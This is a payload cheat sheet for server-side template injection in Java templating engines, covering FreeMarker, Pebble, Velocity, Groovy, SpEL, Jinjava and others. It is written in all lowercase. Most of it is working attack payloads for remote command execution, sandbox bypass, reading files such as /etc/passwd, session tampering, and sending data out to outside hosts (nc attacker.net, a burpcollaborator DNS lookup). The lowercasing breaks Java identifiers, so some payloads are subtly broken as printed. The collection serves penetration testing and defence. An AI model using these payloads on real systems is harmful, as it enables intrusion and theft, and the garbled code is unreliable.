# server side template injection - java

> server-side template injection (ssti)  is a security vulnerability that occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute arbitrary code. in java, ssti can be particularly dangerous due to the power and flexibility of java-based templating engines such as jsp (javaserver pages), thymeleaf, and freemarker.


## summary

- [templating libraries](#templating-libraries)
- [java](#java)
    - [java - basic injection](#java---basic-injection)
    - [java - retrieve environment variables](#java---retrieve-environment-variables)
    - [java - retrieve /etc/passwd](#java---retrieve-etcpasswd)
- [freemarker](#freemarker)
    - [freemarker - basic injection](#freemarker---basic-injection)
    - [freemarker - read file](#freemarker---read-file)
    - [freemarker - code execution](#freemarker---code-execution)
    - [freemarker - sandbox bypass](#freemarker---sandbox-bypass)
- [codepen](#codepen)
- [jinjava](#jinjava)
    - [jinjava - basic injection](#jinjava---basic-injection)
    - [jinjava - command execution](#jinjava---command-execution)
- [pebble](#pebble)
    - [pebble - basic injection](#pebble---basic-injection)
    - [pebble - code execution](#pebble---code-execution)
- [velocity](#velocity)
- [groovy](#groovy)
    - [groovy - basic injection](#groovy---basic-injection)
    - [groovy - read file](#groovy---read-file)
    - [groovy - http request:](#groovy---http-request)
    - [groovy - command execution](#groovy---command-execution)
    - [groovy - sandbox bypass](#groovy---sandbox-bypass)
- [spring expression language](#spring-expression-language)
    - [spel - basic injection](#spel---basic-injection)
    - [spel - dns exfiltration](#spel---dns-exfiltration)
    - [spel - session attributes](#spel---session-attributes)
    - [spel - command execution](#spel---command-execution)
- [references](#references)


## templating libraries

| template name | payload format |
| ------------ | --------- |
| codepen    | `#{}`     |
| freemarker | `${3*3}`, `#{3*3}`, `[=3*3]` |
| groovy     | `${9*9}`  |
| jinjava    | `{{ }}`   |
| pebble     | `{{ }}`   |
| spring     | `*{7*7}`  |
| thymeleaf  | `[[ ]]`   |
| velocity   | `#set($x="") $x`             |


## java

### java - basic injection

> multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.

```java
${7*7}
${{7*7}}
${class.getclassloader()}
${class.getresource("").getpath()}
${class.getresource("../../../../../index.htm").getcontent()}
```

### java - retrieve environment variables

```java
${t(java.lang.system).getenv()}
```

### java - retrieve /etc/passwd

```java
${t(java.lang.runtime).getruntime().exec('cat /etc/passwd')}

${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec(t(java.lang.character).tostring(99).concat(t(java.lang.character).tostring(97)).concat(t(java.lang.character).tostring(116)).concat(t(java.lang.character).tostring(32)).concat(t(java.lang.character).tostring(47)).concat(t(java.lang.character).tostring(101)).concat(t(java.lang.character).tostring(116)).concat(t(java.lang.character).tostring(99)).concat(t(java.lang.character).tostring(47)).concat(t(java.lang.character).tostring(112)).concat(t(java.lang.character).tostring(97)).concat(t(java.lang.character).tostring(115)).concat(t(java.lang.character).tostring(115)).concat(t(java.lang.character).tostring(119)).concat(t(java.lang.character).tostring(100))).getinputstream())}
```

---

## freemarker

[official website](https://freemarker.apache.org/)
> apache freemarker™ is a template engine: a java library to generate text output (html web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. 

you can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

### freemarker - basic injection

the template can be :

* default: `${3*3}`  
* legacy: `#{3*3}`
* alternative: `[=3*3]` since [freemarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)

### freemarker - read file

```js
${product.getclass().getprotectiondomain().getcodesource().getlocation().touri().resolve('path_to_the_file').tourl().openstream().readallbytes()?join(" ")}
convert the returned bytes to ascii
```

### freemarker - code execution

```js
<#assign ex = "freemarker.template.utility.execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.execute'?new()]${ ex('id')}
${"freemarker.template.utility.execute"?new()("id")}
#{"freemarker.template.utility.execute"?new()("id")}
[="freemarker.template.utility.execute"?new()("id")]
```

### freemarker - sandbox bypass

:warning: only works on freemarker versions below 2.3.30

```js
<#assign classloader=article.class.protectiondomain.classloader>
<#assign owc=classloader.loadclass("freemarker.template.objectwrapper")>
<#assign dwf=owc.getfield("default_wrapper").get(null)>
<#assign ec=classloader.loadclass("freemarker.template.utility.execute")>
${dwf.newinstance(ec,null)("id")}
```

---

## codepen

[official website](https://codepen.io/)
> 

```python
- var x = root.process
- x = x.mainmodule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainmodule.require('child_process').spawnsync('cat', ['/etc/passwd']).stdout}
```

---

## jinjava

[official website](https://github.com/hubspot/jinjava)
> java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in hubspot content).

### jinjava - basic injection

```python
{{'a'.touppercase()}} would result in 'a'
{{ request }} would return a request object like com.[...].context.templatecontextrequest@23548206
```

jinjava is an open source project developed by hubspot, available at [https://github.com/hubspot/jinjava/](https://github.com/hubspot/jinjava/)

### jinjava - command execution

fixed by [hubspot/jinjava pr #230](https://github.com/hubspot/jinjava/pull/230)

```ps1
{{'a'.getclass().forname('javax.script.scriptenginemanager').newinstance().getenginebyname('javascript').eval(\"new java.lang.string('xxx')\")}}

{{'a'.getclass().forname('javax.script.scriptenginemanager').newinstance().getenginebyname('javascript').eval(\"var x=new java.lang.processbuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getclass().forname('javax.script.scriptenginemanager').newinstance().getenginebyname('javascript').eval(\"var x=new java.lang.processbuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.ioutils.tostring(x.start().getinputstream())\")}}

{{'a'.getclass().forname('javax.script.scriptenginemanager').newinstance().getenginebyname('javascript').eval(\"var x=new java.lang.processbuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.ioutils.tostring(x.start().getinputstream())\")}}
```

---

## pebble

[official website](https://pebbletemplates.io/)

> pebble is a java templating engine inspired by [twig](./#twig) and similar to the python [jinja](./#jinja2) template engine syntax. it features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.

### pebble - basic injection

```java
{{ somestring.touppercase() }}
```

### pebble - code execution

old version of pebble ( < version 3.0.9): `{{ variable.getclass().forname('java.lang.runtime').getruntime().exec('ls -la') }}`.

new version of pebble :

```java
{% set cmd = 'id' %}
{% set bytes = (1).type
     .forname('java.lang.runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputstream
     .readallbytes() %}
{{ (1).type
     .forname('java.lang.string')
     .constructors[0]
     .newinstance(([bytes]).toarray()) }}
```

---

## velocity

[official website](https://velocity.apache.org/engine/1.7/user-guide.html)

> velocity is a java-based template engine. it permits web page designers to reference methods defined in java code.

```python
#set($str=$class.inspect("java.lang.string").type)
#set($chr=$class.inspect("java.lang.character").type)
#set($ex=$class.inspect("java.lang.runtime").type.getruntime().exec("whoami"))
$ex.waitfor()
#set($out=$ex.getinputstream())
#foreach($i in [1..$out.available()])
$str.valueof($chr.tochars($out.read()))
#end
```

---

## groovy

[official website](https://groovy-lang.org/)

### groovy - basic injection

refer to https://groovy-lang.org/syntax.html , but `${9*9}` is the basic injection.

### groovy - read file

```groovy
${string x = new file('c:/windows/notepad.exe').text}
${string x = new file('/path/to/file').gettext('utf-8')}
${new file("c:\temp\filename.txt").createnewfile();}
```

### groovy - http request

```groovy
${"http://www.google.com".tourl().text}
${new url("http://www.google.com").gettext()}
```

### groovy - command execution

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a script class)}
${new org.codehaus.groovy.runtime.methodclosure("calc.exe","execute").call()}
```

### groovy - sandbox bypass

```groovy
${ @asttest(value={assert java.lang.runtime.getruntime().exec("whoami")})
def x }
```

or

```groovy
${ new groovy.lang.groovyclassloader().parseclass("@groovy.transform.asttest(value={assert java.lang.runtime.getruntime().exec(\"calc.exe\")})def x") }
```

---

## spring expression language

[official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)

> the spring expression language (spel for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. the language syntax is similar to unified el but offers additional features, most notably method invocation and basic string templating functionality.

### spel - basic injection

```java
${7*7}
${'patt'.tostring().replace('a', 'x')}
```


### spel - dns exfiltration

dns lookup

```java
${"".getclass().forname("java.net.inetaddress").getmethod("getbyname","".getclass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
```


### spel - session attributes

modify session attributes

```java
${pagecontext.request.getsession().setattribute("admin",true)}
```


### spel - command execution

* method using `java.lang.runtime` #1 - accessed with javaclass
    ```java
    ${t(java.lang.runtime).getruntime().exec("command_here")}
    ```

* method using `java.lang.runtime` #2
    ```java
    #{session.setattribute("rtc","".getclass().forname("java.lang.runtime").getdeclaredconstructors()[0])}
    #{session.getattribute("rtc").setaccessible(true)}
    #{session.getattribute("rtc").getruntime().exec("/bin/bash -c whoami")}
    ```

* method using `java.lang.runtime` #3 - accessed with `invoke`
    ```java
    ${''.getclass().forname('java.lang.runtime').getmethods()[6].invoke(''.getclass().forname('java.lang.runtime')).exec('command_here')}
    ```

* method using `java.lang.runtime` #3 - accessed with `javax.script.scriptenginemanager`
    ```java
    ${request.getclass().forname("javax.script.scriptenginemanager").newinstance().getenginebyname("js").eval("java.lang.runtime.getruntime().exec(\\\"ping x.x.x.x\\\")"))}
    ```

* method using `java.lang.processbuilder`
    ```java
    ${request.setattribute("c","".getclass().forname("java.util.arraylist").newinstance())}
    ${request.getattribute("c").add("cmd.exe")}
    ${request.getattribute("c").add("/k")}
    ${request.getattribute("c").add("ping x.x.x.x")}
    ${request.setattribute("a","".getclass().forname("java.lang.processbuilder").getdeclaredconstructors()[0].newinstance(request.getattribute("c")).start())}
    ${request.getattribute("a")}
    ```


## references

- [server side template injection – on the example of pebble - michał bentkowski - september 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
- [server-side template injection: rce for the modern web app - james kettle (@albinowax) - december 10, 2015](https://gist.github.com/yas3r/7006ec36ffb987cbfb98)
- [server-side template injection: rce for the modern web app (pdf) - james kettle (@albinowax) - august 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-kettle-server-side-template-injection-rce-for-the-modern-web-app-wp.pdf)
- [server-side template injection: rce for the modern web app (video) - james kettle (@albinowax) - december 28, 2015](https://www.youtube.com/watch?v=3ct0ue7y87s)
- [velocityservlet expression language injection - magicblue - november 15, 2017](https://magicbluech.github.io/2017/11/15/velocityservlet-expression-language-injection/)
- [bean stalking: growing java beans into rce - alvaro munoz - july 7, 2020](https://securitylab.github.com/research/bean-validation-rce)
- [bug writeup: rce via ssti on spring boot error page with akamai waf bypass - peter m (@pmnh_) - december 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
- [expression language injection - owasp - december 4, 2019](https://owasp.org/www-community/vulnerabilities/expression_language_injection)
- [expression language injection - portswigger - january 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
- [leveraging the spring expression language (spel) injection vulnerability (a.k.a the magic spel) to get rce - xenofon vassilakopoulos - november 18, 2021](https://xen0vas.github.io/leveraging-the-spel-injection-vulnerability-to-get-rce/)
- [rce in hubspot with el injection in hubl - @fyoorer - december 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
- [remote code execution with el injection vulnerabilities - asif durani - january 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)